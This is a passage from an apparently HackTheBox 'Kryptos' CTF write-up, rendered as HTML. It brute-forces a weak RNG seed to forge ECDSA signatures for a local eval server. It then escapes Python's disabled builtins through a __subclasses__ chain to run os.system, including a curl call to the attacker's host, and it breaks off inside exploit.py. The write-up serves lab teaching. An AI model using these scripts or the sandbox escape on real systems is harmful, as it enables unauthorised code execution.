</span><span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/debug'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'GET'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="n">expr</span> <span class="o">=</span> <span class="s">'2+2'</span>
    <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">expr</span><span class="p">))</span>
    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                <span class="p">{</span>
                    <span class="s">'Expression'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span>
                    <span class="s">'Signature'</span><span class="p">:</span> <span class="n">sig</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> 
                <span class="p">}</span>
                <span class="p">}</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

<span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">81</span><span class="p">,</span> <span class="n">reloader</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>
<p>First thing I noticed was that It’s a server which runs on <code class="language-plaintext highlighter-rouge">localhost</code> on port 81 :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run(host='127.0.0.1', port=81, reloader=True)
</code></pre></div></div>
<p>I checked the listening ports on the box and the server was running :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rijndael@kryptos:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
rijndael@kryptos:~$ 
</code></pre></div></div>
<p>There’s a route called <code class="language-plaintext highlighter-rouge">/eval</code> which accepts POST requests in <code class="language-plaintext highlighter-rouge">json</code> and evaluates whatever is in <code class="language-plaintext highlighter-rouge">expr</code>, However there are two problems, first one is that it only evaluates signed expressions, second one is that even if we could bypass that protection we can’t execute something useful because <code class="language-plaintext highlighter-rouge">builtins</code> are disabled :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/eval'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">evaluate</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span> 
        <span class="n">req_data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span>
        <span class="n">expr</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'expr'</span><span class="p">]</span>
        <span class="n">sig</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'sig'</span><span class="p">]</span>
        <span class="c1"># Only signed expressions will be evaluated
</span>        <span class="k">if</span> <span class="ow">not</span> <span class="n">verify</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">expr</span><span class="p">),</span> <span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)):</span>
            <span class="k">return</span> <span class="s">"Bad signature"</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="p">{</span><span class="s">'__builtins__'</span><span class="p">:</span><span class="bp">None</span><span class="p">})</span> <span class="c1"># Builtins are removed, this should be pretty safe
</span>        <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                    <span class="p">{</span>
                        <span class="s">'Expression'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span>
                        <span class="s">'Result'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> 
                    <span class="p">}</span>
                    <span class="p">}</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Error"</span>
</code></pre></div></div>
<p>Let’s take a look at the keys and the secure random number generator function (<code class="language-plaintext highlighter-rouge">secure_rng</code>) :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
    <span class="c1"># Taken from the internet - probably secure
</span>    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>

    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="c1"># Set up the keys
</span><span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
<span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span>
<span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span>
</code></pre></div></div>
<p>I noticed this comment :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Taken from the internet - probably secure
</span></code></pre></div></div>
<p>I took the <code class="language-plaintext highlighter-rouge">rng</code> function from the script and wrote a script to test how random is it :
<code class="language-plaintext highlighter-rouge">test.py</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">random</span> 
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">VerifyingKey</span><span class="p">,</span> <span class="n">SigningKey</span><span class="p">,</span> <span class="n">NIST384p</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">debug</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">hook</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">response</span> <span class="k">as</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>
    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span> 
    <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> 
    <span class="k">print</span> <span class="n">rand</span>
</code></pre></div></div>
<p>I set the range to <code class="language-plaintext highlighter-rouge">15</code> to print 15 samples :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ./test.py 
7470457370149431962811031290883090829243224817138100905771457032768589009029
8
14940914740298863925622062581766181658486449634276201811542914065537178018057
2
3735228685074715981405515645441545414621612408569050452885728516384294504515
7470457370149431962811031290883090829243224817138100905771457032768594247974
1
59763658961195455702488250327064726633945798537104807246171656262148712072266
18
14940914740298863925622062581766181658486449634276201811542914065537178345497
1
7470457370149431962811031290883090829243224817138100905771457032768589172749
29881829480597727851244125163532363316972899268552403623085828131074356036133
12
396
</code></pre></div></div>
<p>As you can see, it’s not that “random”</p>

<h2 id="kryptospy-bruteforcing-the-seed">kryptos.py: Bruteforcing the Seed</h2>
<p>Knowing that the random number generator is not random enough, It’s possible to bruteforce the seed.<br>
I tunneled port 81 to my box :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ssh -L 81:127.0.0.1:81 rijndael@kryptos.htb
rijndael@kryptos.htb's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Sep 19 22:10:59 2019 from 10.10.xx.xx
rijndael@kryptos:~$ 
</code></pre></div></div>
<p>Then I wanted to test the server response :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# curl -X POST http://127.0.0.1:81/eval -H 'Content-Type: application/json' -d '{"expr": "1+1", "sig": "123"}'
Bad signature
</code></pre></div></div>
<p>I wrote a script to bruteforce the seed :
<code class="language-plaintext highlighter-rouge">brute.py</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">random</span> 
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">VerifyingKey</span><span class="p">,</span> <span class="n">SigningKey</span><span class="p">,</span> <span class="n">NIST384p</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">debug</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">hook</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">response</span> <span class="k">as</span> <span class="n">resp</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>
    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">sk</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>

<span class="n">num</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
    <span class="n">expr</span> <span class="o">=</span> <span class="s">"1+1"</span>
    <span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span> 
    <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> 
    <span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span> 
    <span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span> 
    <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span> 
    
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://127.0.0.1:81/eval'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">'expr'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span> <span class="s">'sig'</span><span class="p">:</span> <span class="n">sig</span><span class="p">})</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span>
    <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s">"Bad signature"</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[-] Attempt "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">": failed"</span>
        <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[+] Found the seed: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>
<p>The script sends a simple expression : <code class="language-plaintext highlighter-rouge">1+1</code> and uses the functions from <code class="language-plaintext highlighter-rouge">kryptos.py</code> to sign it, every attempt the server responds with <code class="language-plaintext highlighter-rouge">Bad signature</code> it regenerates the signing key and tries again.<br>
It could find the right seed after 2 attempts, however sometimes it takes between 30-40 attempts and sometimes it takes more than 100 attempts.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ./brute.py
[-] Attempt 1: failed
[-] Attempt 2: failed
[+] Found the seed: 78272723826101975912150018057949619293
</code></pre></div></div>
<p>I wrote this script to sign and evaluate expressions depending on the given seed :
<code class="language-plaintext highlighter-rouge">eval.py</code></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">random</span> 
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">VerifyingKey</span><span class="p">,</span> <span class="n">SigningKey</span><span class="p">,</span> <span class="n">NIST384p</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">debug</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">hook</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">response</span> <span class="k">as</span> <span class="n">resp</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>
    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">sk</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">eval</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">):</span> 
	<span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> 
	<span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span> 
	<span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span> 
	<span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://127.0.0.1:81/eval'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">'expr'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span> <span class="s">'sig'</span><span class="p">:</span> <span class="n">sig</span><span class="p">})</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span>
	<span class="k">print</span> <span class="n">response</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
	<span class="k">print</span> <span class="s">"Usage: {} &lt;seed&gt; &lt;expression&gt;"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
	<span class="nb">exit</span><span class="p">()</span>
<span class="k">else</span><span class="p">:</span>
	<span class="n">seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
	<span class="n">expr</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nb">eval</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
</code></pre></div></div>
<p>Let’s try the seed we got :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali:~/Desktop/HTB/boxes/kryptos#</span><span class="w"> </span><span class="err">./eval.py</span><span class="w"> </span><span class="mi">78272723826101975912150018057949619293</span><span class="w"> </span><span class="mi">1</span><span class="err">+</span><span class="mi">1</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"response"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Expression"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1+1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Result"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>It worked.<br></p>

<h2 id="kryptospy-exploitation-root-flag">kryptos.py: Exploitation, Root Flag</h2>
<p>We still have the problem of disabled <code class="language-plaintext highlighter-rouge">builtins</code>, as you can see we can’t do anything :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# ./eval.py 78272723826101975912150018057949619293 'import os;os.system("whoami")'
Error
</code></pre></div></div>
<p>xct had a <a href="https://vulndev.io/2019/01/notes_misc.html#bypass-python-builtinsnone" target="_blank" rel="noopener noreferrer">bypass</a> for that on his blog :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="s">'Pattern'</span><span class="p">][</span><span class="mi">0</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s">'__builtins__'</span><span class="p">][</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">).</span><span class="n">system</span><span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span>
</code></pre></div></div>
<p>I gave it a try and it worked :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali:~/Desktop/HTB/boxes/kryptos#</span><span class="w"> </span><span class="err">./eval.py</span><span class="w"> </span><span class="mi">78272723826101975912150018057949619293</span><span class="w"> </span><span class="s2">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"</span><span class="w">                                                                                                                                                             
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"response"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Expression"</span><span class="p">:</span><span class="w"> </span><span class="s2">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"</span><span class="p">,</span><span class="w">               
    </span><span class="nl">"Result"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p><br><img src="/images/hackthebox/kryptos/19.png" alt="" class="align-center"><br><br>
Now that we have RCE, I wrapped it all up in one exploit :
<code class="language-plaintext highlighter-rouge">exploit.py</code></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">random</span> 
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">VerifyingKey</span><span class="p">,</span> <span class="n">SigningKey</span><span class="p">,</span> <span class="n">NIST384p</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">debug</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">hook</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">response</span> <span class="k">as</span> <span class="n">resp</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span> 
    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>
    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

